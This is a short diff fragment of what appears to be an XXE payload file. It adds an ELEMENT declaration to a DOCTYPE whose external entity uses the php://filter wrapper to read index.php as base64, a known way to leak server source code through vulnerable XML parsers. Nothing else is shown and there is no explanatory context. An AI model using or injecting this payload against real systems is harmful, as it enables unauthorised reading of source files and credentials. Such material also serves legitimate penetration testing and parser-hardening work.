@@ -2,5 +2,7 @@
 
  
  <!DOCTYPE foo [  
+
+   <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>
 
